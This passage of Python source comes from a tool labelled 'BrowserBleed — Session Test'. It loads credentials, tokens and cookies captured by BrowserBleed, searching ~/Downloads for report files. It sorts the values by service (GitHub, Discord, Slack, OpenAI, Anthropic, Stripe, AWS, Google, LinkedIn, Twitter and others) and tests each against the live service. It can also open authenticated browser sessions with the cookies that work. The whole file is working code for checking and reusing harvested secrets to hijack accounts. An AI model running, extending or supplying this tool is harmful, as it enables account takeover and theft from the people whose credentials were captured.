            "domain": domain if domain.startswith(".") else f".{domain}",
            "path":   "/",
        } for c in cookies])
        page = ctx.new_page()
        page.goto(url)
        input(dim("  Press Enter to close browser…"))
        browser.close()

# ── Dispatch ──────────────────────────────────────────────────────────────────

def _dispatch(label: str, service: str, value: str, browser: bool) -> list[Result]:
    lo = label.lower()
    v  = value.strip()

    # Strip "Bearer " prefix stored verbatim by BrowserBleed memory captures
    if v.lower().startswith("bearer "):
        v = v[7:].strip()

    # GitHub
    if any(x in lo for x in ("github",)) or v.startswith(("ghp_", "gho_", "ghs_", "ghr_", "ghu_")):
        return [test_github(v, label)]

    # Discord user token (M/N prefix + base64 user ID + dot-separated parts)
    if lo == "discord token" or ("discord" in service.lower()
                                  and v.count(".") >= 1 and v[:1] in ("M", "N")
                                  and len(v.split(".")[0]) >= 10):
        return [test_discord(v, label)]

    # Spotify access token — BQA is the Spotify-specific prefix; AQA is too broad
    if v.startswith("BQA") or "spotify" in service.lower():
        return [test_spotify(v, label)]

    # Microsoft Graph / Azure
    if "microsoft" in service.lower() or "azure" in service.lower():
        return [test_microsoft(v, label)]

    # Google SAPISID cookie
    if v.startswith("SAPISID=") or "sapisid" in lo:
        return [test_google_sapisid(v, label)]

    # Google OAuth access token
    if v.startswith("ya29."):
        return [test_google_oauth(v, label)]

    # Google OAuth2 refresh token — cannot validate without client credentials
    if v.startswith("1//"):
        return [Result("Google", label, v[:16] + "…", "info",
                       "—", "OAuth2 refresh token — cannot validate without client credentials", {})]

    # Slack
    if v.startswith(("xoxp-", "xoxb-", "xoxa-", "xoxs-", "xoxe-")):
        return [test_slack(v, label)]

    # Session token — route by service
    if lo == "session token":
        svc_lo = service.lower()
        if "anthropic" in svc_lo:
            return [test_anthropic_session(v, label)]
        if "google" in svc_lo:
            return [test_google_oauth(v, label)]  # try as OAuth bearer

    # Anthropic API key
    if v.startswith("sk-ant-"):
        return [test_anthropic(v, label)]

    # OpenAI
    if v.startswith("sk-") and not v.startswith("sk-ant-"):
        return [test_openai(v, label)]

    # HuggingFace
    if v.startswith("hf_"):
        return [test_huggingface(v, label)]

    # Stripe
    if v.startswith(("sk_live_", "sk_test_", "rk_live_", "rk_test_")):
        return [test_stripe(v, label)]

    # npm auth token (typically 36-char UUID or base64)
    if "npm" in lo:
        return [test_npm(v, label)]

    # SendGrid API key
    if lo == "sendgrid token" or v.startswith("SG."):
        return [test_sendgrid(v, label)]

    # LinkedIn li_at session cookie
    if lo == "linkedin li_at":
        return [test_linkedin_li_at(v, label)]

    # Twitter/X auth_token session cookie
    if lo == "twitter auth_token":
        return [test_twitter_auth_token(v, label)]

    # Anthropic session label (direct 20111... capture, distinct from Session token label)
    if lo == "anthropic session":
        return [test_anthropic_session(v, label)]

    # Session key — route by service
    if lo == "session key":
        svc_lo = service.lower()
        if "anthropic" in svc_lo:
            return [test_anthropic_session(v, label)]
        if "google" in svc_lo:
            return [test_google_oauth(v, label)]
        return [Result(service or "Unknown", label, v[:16] + "…", "info",
                       "—", "session key — cookie name not identifiable from context", {})]

    # Session ID routing based on service label
    if lo == "session id":
        svc_lo = service.lower()
        if "google" in svc_lo:
            return [test_google_session_id(v, label)]
        if "linkedin" in svc_lo:
            return [test_linkedin_session_id(v, label)]
        if "anthropic" in svc_lo:
            return [Result("Anthropic", label, v[:16] + "…", "info",
                           "—", "session ID — cookie name undetermined for claude.ai", {})]
        if "aws" in svc_lo:
            return [Result("AWS", label, v[:16] + "…", "info",
                           "—", "AWS SDK session ID — not a web auth cookie", {})]
        return [Result(service or "Unknown", label, v[:16] + "…", "info",
                       "—", "session ID — service not identifiable", {})]

    # JWT/JWE — three base64url parts separated by dots
    parts = v.split(".")
    if len(parts) == 3 and all(len(p) > 10 for p in parts):
        decoded = _decode_jwt(v)
        if decoded:
            return [test_jwt(v, label, service)]
        # JWE (encrypted JWT) — try to read expiry from the unencrypted header
        try:
            hdr = json.loads(base64.urlsafe_b64decode(_b64pad(parts[0])))
            if hdr.get("enc"):
                now   = time.time()
                exp   = hdr.get("exp")
                iss   = hdr.get("iss") or hdr.get("c") or ""
                if exp:
                    exp_s     = exp / 1000 if exp > 1e12 else exp
                    remaining = exp_s - now
                    time_str  = (f"expired {int(-remaining // 3600)}h ago"
                                 if remaining < 0 else
                                 f"valid for {int(remaining // 3600)}h{int(remaining % 3600) // 60}m")
                    stat = "expired" if remaining < 0 else "info"
                else:
                    time_str, stat = "no expiry", "info"
                access = f"JWE (encrypted) — {time_str}"
                if iss:
                    access += f"  iss={str(iss)[:30]}"
                return [Result(service or "JWE", label, v[:20] + "…", stat, "—", access, hdr)]
        except Exception:
            pass

    # Password captured without identifiable service context
    if "password" in lo:
        return [Result(service or "Unknown", label, v[:16] + "…", "info",
                       "—", "password/API credential — service not identifiable from memory context", {})]

    # OAuth access/refresh tokens — route by service or emit info
    if "access_token" in lo or "refresh" in lo:
        svc_lo = service.lower()
        if "google" in svc_lo:
            return [test_google_oauth(v, label)]
        if "github" in svc_lo:
            return [test_github(v, label)]
        if "slack" in svc_lo:
            return [test_slack(v, label)]
        if "refresh" in lo:
            return [Result(service or "OAuth", label, v[:16] + "…", "info",
                           "—", "refresh token — cannot validate without client_id/client_secret", {})]
        # access_token from unknown service
        return [Result(service or "OAuth", label, v[:16] + "…", "info",
                       "—", "OAuth access token — service unidentifiable from context", {})]

    # Bearer token with service hint (after prefix strip above)
    if "bearer" in lo:
        svc_lo = service.lower()
        if "github" in svc_lo:
            return [test_github(v, label)]
        if "google" in svc_lo:
            return [test_google_oauth(v, label)]
        if "slack" in svc_lo:
            return [test_slack(v, label)]
        if "discord" in svc_lo and v.count(".") == 2 and v[:1] in ("M", "N"):
            return [test_discord(v, label)]
        if "spotify" in svc_lo or v.startswith("BQA"):
            return [test_spotify(v, label)]

    return []  # no tester matched


# ── CSV reading ───────────────────────────────────────────────────────────────

def _extract_csv_from_zip(zip_path: str) -> str | None:
    """Extract CSV from a BrowserBleed report zip and return its path."""
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            csv_files = [f for f in z.namelist() if f.endswith('.csv')]
            if not csv_files:
                return None
            csv_file = csv_files[0]
            # Prevent path traversal: reject paths with .. or absolute paths
            if '..' in csv_file or os.path.isabs(csv_file):
                return None
            temp_dir = tempfile.gettempdir()
            z.extract(csv_file, temp_dir)
            extracted_path = os.path.join(temp_dir, csv_file)
            return extracted_path
    except (zipfile.BadZipFile, zipfile.LargeZipFile, OSError, IOError):
        return None
    except Exception as e:
        if not os.environ.get("BB_QUIET"):
            print(yellow(f"  Warning: Failed to extract zip: {e}"))
        return None


def _find_latest_report_zip() -> str | None:
    """Find the most recent BrowserBleed report zip in ~/Downloads."""
    home = os.path.expanduser("~")
    downloads = os.path.join(home, "Downloads")
    if not os.path.exists(downloads):
        return None

    pattern = os.path.join(downloads, "*_????-??-??*.zip")
    zips = glob.glob(pattern)
    if not zips:
        return None

    try:
        return max(zips, key=os.path.getmtime)
    except (OSError, ValueError):
        # File deleted between glob and max, or no valid files
        return None


def _find_csv() -> str | None:
    # 1. Check BB_RESULTS_CSV environment variable
    env_path = os.environ.get("BB_RESULTS_CSV")
    if env_path and os.path.exists(env_path):
        return env_path

    # 2. Check current directory and script directory
    candidates = [
        "bb_results.csv",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_results.csv"),
    ]

    # 3. Check for recently extracted CSVs in ~/Downloads matching pattern *_YYYY-MM-DD*.csv
    home = os.path.expanduser("~")
    if home:
        downloads = os.path.join(home, "Downloads")
        if os.path.exists(downloads):
            pattern = os.path.join(downloads, "*_????-??-??*.csv")
            csvs = glob.glob(pattern)
            if csvs:
                latest_csv = max(csvs, key=os.path.getmtime)
                candidates.insert(0, latest_csv)

    for p in candidates:
        if os.path.exists(p):
            return p

    # 4. Look for the most recent zip in ~/Downloads and extract it
    latest_zip = _find_latest_report_zip()
    if latest_zip:
        csv_path = _extract_csv_from_zip(latest_zip)
        if csv_path and os.path.exists(csv_path):
            if not os.environ.get("BB_QUIET"):
                print(cyan(f"  Auto-extracted from {os.path.basename(latest_zip)}"))
            return csv_path

    return None


def load_rows(path: str) -> list[dict]:
    with open(path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.DictReader(f)
        return list(reader)


# ── Main ──────────────────────────────────────────────────────────────────────

BANNER = """\
  ╔══════════════════════════════════════════╗
  ║   BrowserBleed — Session Test           ║
  ║   Test captured credentials live        ║
  ╚══════════════════════════════════════════╝\
"""

def main():
    global _timeout, _ssl_ctx

    # Ensure UTF-8 output on Windows (skip if already wrapped or not a real stream)
    if (
        sys.platform == "win32"
        and not isinstance(sys.stdout, io.TextIOWrapper)
        and hasattr(sys.stdout, "buffer")
    ):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

    parser = argparse.ArgumentParser(
        description="Test BrowserBleed captured credentials against live services",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("csv_file", nargs="?", help="bb_results.csv path (auto-detected if omitted)")
    parser.add_argument("--browser-open",   action="store_true", help="Open browser sessions for valid credentials (requires Selenium)")
    parser.add_argument("--browser-keep",   action="store_true", help="Keep browser windows open after testing (used with --browser-open)")
    parser.add_argument("--timeout",        type=int, default=10, metavar="SECS", help="Per-request timeout in seconds (default 10)")
    parser.add_argument("--no-verify-ssl",  action="store_true", help="Skip TLS certificate verification")
    parser.add_argument("--json",           action="store_true", help="Output results as JSON")
    parser.add_argument("--delay",          type=float, default=0.3, metavar="SECS", help="Delay between requests (default 0.3s)")
    args = parser.parse_args()

    _timeout = args.timeout
    if args.no_verify_ssl:
        _ssl_ctx = ssl.create_default_context()
        _ssl_ctx.check_hostname = False
        _ssl_ctx.verify_mode    = ssl.CERT_NONE

    csv_path = args.csv_file or _find_csv()
    if not csv_path:
        print(red("[!] No bb_results.csv found. Run BrowserBleed first, or pass the path explicitly."))
        sys.exit(1)
    if not os.path.exists(csv_path):
        print(red(f"[!] File not found: {csv_path}"))
        sys.exit(1)

    if not args.json:
        print(bold(BANNER))
        print(f"\n  {dim('Source:')} {csv_path}\n")

    rows = load_rows(csv_path)
    if not rows:
        print(yellow("[!] CSV is empty."))
        sys.exit(0)

    # ── Separate cookies (need to be grouped by domain) ─────────────────────
    cookie_rows:  list[dict] = []
    cred_rows:    list[dict] = []
    for row in rows:
        label_lo = row.get("label", "").lower()
        if "cookie" in label_lo:
            if label_lo == "cookie header":
                continue  # raw Chrome error-count string, not a real session cookie
            cookie_rows.append(row)
        else:
            cred_rows.append(row)

    # ── Deduplicate non-cookie credentials by value ──────────────────────────
    seen_values: set[str] = set()
    unique_creds: list[dict] = []
    for row in cred_rows:
        v = row.get("value", "").strip()
        if not v or v in seen_values:
            continue
        seen_values.add(v)
        unique_creds.append(row)

    # ── Group cookies by domain ──────────────────────────────────────────────
    cookies_by_domain: dict[str, list[dict]] = defaultdict(list)
    seen_cookie_pairs: set[tuple] = set()
    for row in cookie_rows:
        domain  = row.get("service", "") or row.get("address", "")
        raw_val = row.get("value", "")
        if "=" in raw_val:
            name, _, val = raw_val.partition("=")
        else:
            name, val = raw_val, ""
        pair = (domain, name, val)
        if pair in seen_cookie_pairs:
            continue
        seen_cookie_pairs.add(pair)
        cookies_by_domain[domain].append({"name": name.strip(), "value": val.strip()})

    # ── Try to pair AWS access keys with secret keys ─────────────────────────
    aws_keys: dict[str, str] = {}  # access_key_id → secret (if found together)
    for row in unique_creds:
        v = row.get("value", "").strip()
        if len(v) == 20 and v.startswith(("AKIA", "ASIA", "AROA", "AIDA")):
            aws_keys[v] = ""  # mark as found, secret TBD

    # Look for AWS secret keys (40-char base64-ish strings near AWS key rows)
    # Simple heuristic: if there's exactly one AWS key and one 40-char secret-looking value nearby
    aws_secrets = [
        row.get("value", "").strip() for row in unique_creds
        if row.get("label", "").lower() in ("aws secret key", "aws secret access key")
           and len(row.get("value", "").strip()) == 40
    ]
    if len(aws_keys) == 1 and len(aws_secrets) == 1:
        only_key = next(iter(aws_keys))
        aws_keys[only_key] = aws_secrets[0]

    # ── Run tests ─────────────────────────────────────────────────────────────
    all_results: list[Result] = []
    total     = len(unique_creds) + len(cookies_by_domain)
    n_shown   = 0
    n_skipped = 0

    if not args.json:
        print(f"  Testing {bold(str(len(unique_creds)))} unique credential(s)  +  "
              f"{bold(str(len(cookies_by_domain)))} cookie domain(s)…\n")

    # Test credentials in parallel for speed (8 workers max to avoid rate limiting)
    def test_credential(row):
        label   = row.get("label", "")
        service = row.get("service", "")
        value   = row.get("value", "").strip()

        if value in aws_keys:
            secret = aws_keys[value]
            if secret:
                return [test_aws(value, secret, label)]
            else:
                return [Result("AWS", label, value[:16] + "…", "info",
                              "—", "secret key not found — cannot sign request", {})]
        return _dispatch(label, service, value, False)

    # API credentials - parallel testing
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(test_credential, row): row for row in unique_creds}
        for future in as_completed(futures):
            try:
                results = future.result()
                for r in results:
                    all_results.append(r)
                    n_shown += 1
                    if not args.json:
                        _print_progress(n_shown, total, r)
                if not results:
                    n_skipped += 1
            except Exception as e:
                if not args.json:
                    print(f"  {red(f'! error   ')}  {str(e)[:50]}")
                n_skipped += 1

    # Cookie sessions (sequential, usually just 1)
    for domain, cookies in cookies_by_domain.items():
        if not domain:
            continue
        results = test_cookie_session(domain, cookies, browser=False)
        for r in results:
            all_results.append(r)
            n_shown += 1
            if not args.json:
                _print_progress(n_shown, total, r)
        time.sleep(args.delay)

    # ── Output ────────────────────────────────────────────────────────────────
    if args.json:
        print(json.dumps([r.to_dict() for r in all_results], indent=2))
        return

    if not all_results:
        print(yellow("  No testable credentials found in CSV."))
        print(dim("  (BrowserBleed must capture tokens/cookies with recognised labels)"))
        return

    print()
    _print_table(all_results)

    valid   = sum(1 for r in all_results if r.status == "valid")
    expired = sum(1 for r in all_results if r.status == "expired")
    invalid = sum(1 for r in all_results if r.status == "invalid")
    info    = sum(1 for r in all_results if r.status == "info")

    skip_str = f"   {dim(str(n_skipped) + ' skipped')}" if n_skipped else ""
    print(f"\n  {green(str(valid))} valid   "
          f"{yellow(str(expired))} expired   "
          f"{red(str(invalid))} invalid   "
          f"{dim(str(info))} info"
          f"{skip_str}\n")

    # ── Open browser sessions for valid credentials ────────────────────────────
    if args.browser_open:
        if not SELENIUM_AVAILABLE:
            print(red("[!] Selenium not available. Install with: pip install selenium"))
            return

        # Only browser-testable services (cookies, OAuth, web sessions)
        BROWSER_SERVICES = {"LinkedIn", "GitHub", "Google", "Discord", "Slack", "Anthropic",
                           "Spotify", "Twitter", "Microsoft", "AWS", "OpenAI"}

        # Filter to only truly valid credentials (not just "info")
        valid_results = [r for r in all_results
                        if r.status == "valid" and r.service in BROWSER_SERVICES]

        if not valid_results:
            print(yellow("[!] No browser-testable valid credentials found."))
            print(dim("   (API keys, JWTs, and tokens are tested via API, not browser)"))
            print(dim("   (Inconclusive 'info' status means authentication couldn't be verified)"))
            return

        print(green(f"[+] Opening {len(valid_results)} authenticated browser session(s)…\n"))
        drivers = []
        for r in valid_results:
            driver = open_authenticated_session(
                r.service,
                r.value,
                headless=False,
                wait_seconds=0 if args.browser_keep else 3
            )
            if driver:
                drivers.append((r.service, r.identity, driver))

        if drivers and args.browser_keep:
            print(f"\n{green(f'[+]')} {len(drivers)} session(s) open. Press Ctrl+C to close.")
            try:
                while True:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print(f"\n{dim('[*]')} Closing sessions...")
                for service, identity, driver in drivers:
                    try:
                        driver.quit()
                        print(f"  {dim('[-')} Closed {service} ({identity})")
                    except:
                        pass


# ── Display helpers ────────────────────────────────────────────────────────────

def _status_str(status: str) -> str:
    if status == "valid":   return green("✓ valid  ")
    if status == "expired": return yellow("⏱ expired")
    if status == "invalid": return red("✗ invalid")
    if status == "error":   return red("! error  ")
    return dim("· info   ")

def _print_progress(n: int, total: int, r: Result):
    bar = f"[{n}/{total}]"
    print(f"  {dim(bar):12}  {_status_str(r.status)}  {cyan(r.service):<20}  {r.identity[:40]}")

def _print_table(results: list[Result]):
    W_SVC   = 22
    W_STAT  = 11
    W_LABEL = 18
    W_IDENT = 36
    W_VALUE = 20
    sep = dim("─" * (W_SVC + W_STAT + W_LABEL + W_IDENT + W_VALUE + 12))

    header = (
        f"  {bold('Service'):<{W_SVC+7}}  "
        f"{'Status':<{W_STAT}}  "
        f"{'Label':<{W_LABEL}}  "
        f"{'Identity':<{W_IDENT}}  "
        f"{'Token prefix'}"
    )
    print(header)
    print(sep)
    for r in results:
        svc   = cyan(r.service[:W_SVC])
        stat  = _status_str(r.status)
        label = (r.label[:W_LABEL]).ljust(W_LABEL)
        ident = (r.identity[:W_IDENT]).ljust(W_IDENT)
        val   = dim(r.value_preview)
        print(f"  {svc:<{W_SVC+9}}  {stat}  {label}  {ident}  {val}")
        if r.access and r.status in ("valid", "info"):
            print(f"  {' '*W_SVC}             {' '*W_LABEL}  {dim(r.access[:80])}")
    print(sep)


if __name__ == "__main__":
    main()
